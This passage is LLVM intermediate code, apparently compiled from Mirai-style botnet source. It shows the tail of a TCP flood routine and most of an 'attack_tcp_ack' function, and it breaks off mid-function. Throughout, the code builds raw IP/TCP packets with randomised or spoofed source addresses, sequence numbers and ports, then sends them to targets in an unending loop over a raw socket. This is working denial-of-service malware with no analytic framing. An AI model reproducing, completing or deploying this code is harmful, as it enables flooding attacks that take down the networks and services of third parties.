  %196 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %195, i32 0, i32 4
  %197 = load i16, i16* %196, align 4
  %198 = and i16 %194, 1
  %199 = shl i16 %198, 13
  %200 = and i16 %197, -8193
  %201 = or i16 %200, %199
  store i16 %201, i16* %196, align 4
  %202 = load i8, i8* %21, align 1
  %203 = sext i8 %202 to i16
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %203, 1
  %208 = shl i16 %207, 12
  %209 = and i16 %206, -4097
  %210 = or i16 %209, %208
  store i16 %210, i16* %205, align 4
  %211 = load i8, i8* %22, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 11
  %218 = and i16 %215, -2049
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %23, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 10
  %227 = and i16 %224, -1025
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %24, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 9
  %236 = and i16 %233, -513
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %25, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 8
  %245 = and i16 %242, -257
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8*, i8** %29, align 8
  %248 = getelementptr inbounds i8, i8* %247, i32 1
  store i8* %248, i8** %29, align 8
  store i8 2, i8* %247, align 1
  %249 = load i8*, i8** %29, align 8
  %250 = getelementptr inbounds i8, i8* %249, i32 1
  store i8* %250, i8** %29, align 8
  store i8 4, i8* %249, align 1
  %251 = call i32 @rand_next()
  %252 = and i32 %251, 15
  %253 = add i32 1400, %252
  %254 = trunc i32 %253 to i16
  %255 = call zeroext i16 @htons(i16 zeroext %254) #7
  %256 = load i8*, i8** %29, align 8
  %257 = bitcast i8* %256 to i16*
  store i16 %255, i16* %257, align 2
  %258 = load i8*, i8** %29, align 8
  %259 = getelementptr inbounds i8, i8* %258, i64 2
  store i8* %259, i8** %29, align 8
  %260 = load i8*, i8** %29, align 8
  %261 = getelementptr inbounds i8, i8* %260, i32 1
  store i8* %261, i8** %29, align 8
  store i8 4, i8* %260, align 1
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i32 1
  store i8* %263, i8** %29, align 8
  store i8 2, i8* %262, align 1
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 8, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 10, i8* %266, align 1
  %268 = call i32 @rand_next()
  %269 = load i8*, i8** %29, align 8
  %270 = bitcast i8* %269 to i32*
  store i32 %268, i32* %270, align 4
  %271 = load i8*, i8** %29, align 8
  %272 = getelementptr inbounds i8, i8* %271, i64 4
  store i8* %272, i8** %29, align 8
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 0, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = getelementptr inbounds i8, i8* %277, i32 1
  store i8* %278, i8** %29, align 8
  store i8 1, i8* %277, align 1
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %29, align 8
  store i8 3, i8* %279, align 1
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 3, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 6, i8* %283, align 1
  br label %285

; <label>:285:                                    ; preds = %160
  %286 = load i32, i32* %9, align 4
  %287 = add nsw i32 %286, 1
  store i32 %287, i32* %9, align 4
  br label %108

; <label>:288:                                    ; preds = %108
  br label %289

; <label>:289:                                    ; preds = %436, %288
  store i32 0, i32* %9, align 4
  br label %290

; <label>:290:                                    ; preds = %433, %289
  %291 = load i32, i32* %9, align 4
  %292 = load i8, i8* %5, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp slt i32 %291, %293
  br i1 %294, label %295, label %436

; <label>:295:                                    ; preds = %290
  %296 = load i8**, i8*** %11, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds i8*, i8** %296, i64 %298
  %300 = load i8*, i8** %299, align 8
  store i8* %300, i8** %30, align 8
  %301 = load i8*, i8** %30, align 8
  %302 = bitcast i8* %301 to %struct.iphdr*
  store %struct.iphdr* %302, %struct.iphdr** %31, align 8
  %303 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i64 1
  %305 = bitcast %struct.iphdr* %304 to %struct.tcphdr*
  store %struct.tcphdr* %305, %struct.tcphdr** %32, align 8
  %306 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %307 = load i32, i32* %9, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %306, i64 %308
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %309, i32 0, i32 2
  %311 = load i8, i8* %310, align 4
  %312 = zext i8 %311 to i32
  %313 = icmp slt i32 %312, 32
  br i1 %313, label %314, label %335

; <label>:314:                                    ; preds = %295
  %315 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %316 = load i32, i32* %9, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %315, i64 %317
  %319 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i32 0, i32 1
  %320 = load i32, i32* %319, align 4
  %321 = call i32 @ntohl(i32 %320) #7
  %322 = call i32 @rand_next()
  %323 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %324 = load i32, i32* %9, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i32 0, i32 2
  %328 = load i8, i8* %327, align 4
  %329 = zext i8 %328 to i32
  %330 = lshr i32 %322, %329
  %331 = add i32 %321, %330
  %332 = call i32 @htonl(i32 %331) #7
  %333 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i32 0, i32 9
  store i32 %332, i32* %334, align 4
  br label %335

; <label>:335:                                    ; preds = %314, %295
  %336 = load i32, i32* %26, align 4
  %337 = icmp eq i32 %336, -1
  br i1 %337, label %338, label %342

; <label>:338:                                    ; preds = %335
  %339 = call i32 @rand_next()
  %340 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 8
  store i32 %339, i32* %341, align 4
  br label %342

; <label>:342:                                    ; preds = %338, %335
  %343 = load i16, i16* %13, align 2
  %344 = zext i16 %343 to i32
  %345 = icmp eq i32 %344, 65535
  br i1 %345, label %346, label %352

; <label>:346:                                    ; preds = %342
  %347 = call i32 @rand_next()
  %348 = and i32 %347, 65535
  %349 = trunc i32 %348 to i16
  %350 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 3
  store i16 %349, i16* %351, align 4
  br label %352

; <label>:352:                                    ; preds = %346, %342
  %353 = load i16, i16* %16, align 2
  %354 = zext i16 %353 to i32
  %355 = icmp eq i32 %354, 65535
  br i1 %355, label %356, label %362

; <label>:356:                                    ; preds = %352
  %357 = call i32 @rand_next()
  %358 = and i32 %357, 65535
  %359 = trunc i32 %358 to i16
  %360 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %361 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %360, i32 0, i32 0
  store i16 %359, i16* %361, align 4
  br label %362

; <label>:362:                                    ; preds = %356, %352
  %363 = load i16, i16* %17, align 2
  %364 = zext i16 %363 to i32
  %365 = icmp eq i32 %364, 65535
  br i1 %365, label %366, label %372

; <label>:366:                                    ; preds = %362
  %367 = call i32 @rand_next()
  %368 = and i32 %367, 65535
  %369 = trunc i32 %368 to i16
  %370 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 1
  store i16 %369, i16* %371, align 2
  br label %372

; <label>:372:                                    ; preds = %366, %362
  %373 = load i32, i32* %18, align 4
  %374 = icmp eq i32 %373, 65535
  br i1 %374, label %375, label %379

; <label>:375:                                    ; preds = %372
  %376 = call i32 @rand_next()
  %377 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 2
  store i32 %376, i32* %378, align 4
  br label %379

; <label>:379:                                    ; preds = %375, %372
  %380 = load i32, i32* %19, align 4
  %381 = icmp eq i32 %380, 65535
  br i1 %381, label %382, label %386

; <label>:382:                                    ; preds = %379
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 3
  store i32 %383, i32* %385, align 4
  br label %386

; <label>:386:                                    ; preds = %382, %379
  %387 = load i8, i8* %20, align 1
  %388 = icmp ne i8 %387, 0
  br i1 %388, label %389, label %395

; <label>:389:                                    ; preds = %386
  %390 = call i32 @rand_next()
  %391 = and i32 %390, 65535
  %392 = trunc i32 %391 to i16
  %393 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %394 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %393, i32 0, i32 7
  store i16 %392, i16* %394, align 2
  br label %395

; <label>:395:                                    ; preds = %389, %386
  %396 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 7
  store i16 0, i16* %397, align 2
  %398 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %399 = bitcast %struct.iphdr* %398 to i16*
  %400 = call zeroext i16 @checksum_generic(i16* %399, i32 20)
  %401 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 7
  store i16 %400, i16* %402, align 2
  %403 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 6
  store i16 0, i16* %404, align 4
  %405 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = bitcast %struct.tcphdr* %406 to i8*
  %408 = call zeroext i16 @htons(i16 zeroext 40) #7
  %409 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %405, i8* %407, i16 zeroext %408, i32 40)
  %410 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 6
  store i16 %409, i16* %411, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 1
  %414 = load i16, i16* %413, align 2
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i32 0, i32 0
  %420 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %419, i32 0, i32 1
  store i16 %414, i16* %420, align 2
  %421 = load i32, i32* %10, align 4
  %422 = load i8*, i8** %30, align 8
  %423 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %424 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %425 = load i32, i32* %9, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %424, i64 %426
  %428 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i32 0, i32 0
  %429 = bitcast %struct.sockaddr_in* %428 to %struct.sockaddr*
  store %struct.sockaddr* %429, %struct.sockaddr** %423, align 8
  %430 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %431 = load %struct.sockaddr*, %struct.sockaddr** %430, align 8
  %432 = call i64 @sendto(i32 %421, i8* %422, i64 60, i32 16384, %struct.sockaddr* %431, i32 16)
  br label %433

; <label>:433:                                    ; preds = %395
  %434 = load i32, i32* %9, align 4
  %435 = add nsw i32 %434, 1
  store i32 %435, i32* %9, align 4
  br label %290

; <label>:436:                                    ; preds = %290
  br label %289

; <label>:437:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %440

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %440

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %277, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %280

; <label>:123:                                    ; preds = %118
  %124 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 1
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = and i8 %143, 15
  %145 = or i8 %144, 64
  store i8 %145, i8* %142, align 4
  %146 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = and i8 %148, -16
  %150 = or i8 %149, 5
  store i8 %150, i8* %147, align 4
  %151 = load i8, i8* %12, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 1
  store i8 %151, i8* %153, align 1
  %154 = load i32, i32* %26, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 40, %155
  %157 = trunc i64 %156 to i16
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 2
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %13, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 3
  store i16 %162, i16* %164, align 4
  %165 = load i8, i8* %14, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 5
  store i8 %165, i8* %167, align 4
  %168 = load i8, i8* %15, align 1
  %169 = icmp ne i8 %168, 0
  br i1 %169, label %170, label %174

; <label>:170:                                    ; preds = %123
  %171 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %172 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 4
  store i16 %171, i16* %173, align 2
  br label %174

; <label>:174:                                    ; preds = %170, %123
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 6
  store i8 6, i8* %176, align 1
  %177 = load i32, i32* %28, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 8
  store i32 %177, i32* %179, align 4
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  store i32 %185, i32* %187, align 4
  %188 = load i16, i16* %16, align 2
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  store i16 %189, i16* %191, align 4
  %192 = load i16, i16* %17, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = load i32, i32* %18, align 4
  %197 = trunc i32 %196 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = zext i16 %198 to i32
  %200 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 2
  store i32 %199, i32* %201, align 4
  %202 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -241
  %206 = or i16 %205, 80
  store i16 %206, i16* %203, align 4
  %207 = load i8, i8* %20, align 1
  %208 = sext i8 %207 to i16
  %209 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 4
  %211 = load i16, i16* %210, align 4
  %212 = and i16 %208, 1
  %213 = shl i16 %212, 13
  %214 = and i16 %211, -8193
  %215 = or i16 %214, %213
  store i16 %215, i16* %210, align 4
  %216 = load i8, i8* %21, align 1
  %217 = sext i8 %216 to i16
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 4
  %220 = load i16, i16* %219, align 4
  %221 = and i16 %217, 1
  %222 = shl i16 %221, 12
  %223 = and i16 %220, -4097
  %224 = or i16 %223, %222
  store i16 %224, i16* %219, align 4
  %225 = load i8, i8* %22, align 1
  %226 = sext i8 %225 to i16
  %227 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %228 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %227, i32 0, i32 4
  %229 = load i16, i16* %228, align 4
  %230 = and i16 %226, 1
  %231 = shl i16 %230, 11
  %232 = and i16 %229, -2049
  %233 = or i16 %232, %231
  store i16 %233, i16* %228, align 4
  %234 = load i8, i8* %23, align 1
  %235 = sext i8 %234 to i16
  %236 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 4
  %238 = load i16, i16* %237, align 4
  %239 = and i16 %235, 1
  %240 = shl i16 %239, 10
  %241 = and i16 %238, -1025
  %242 = or i16 %241, %240
  store i16 %242, i16* %237, align 4
  %243 = load i8, i8* %24, align 1
  %244 = sext i8 %243 to i16
  %245 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 4
  %247 = load i16, i16* %246, align 4
  %248 = and i16 %244, 1
  %249 = shl i16 %248, 9
  %250 = and i16 %247, -513
  %251 = or i16 %250, %249
  store i16 %251, i16* %246, align 4
  %252 = load i8, i8* %25, align 1
  %253 = sext i8 %252 to i16
  %254 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = and i16 %253, 1
  %258 = shl i16 %257, 8
  %259 = and i16 %256, -257
  %260 = or i16 %259, %258
  store i16 %260, i16* %255, align 4
  %261 = call i32 @rand_next()
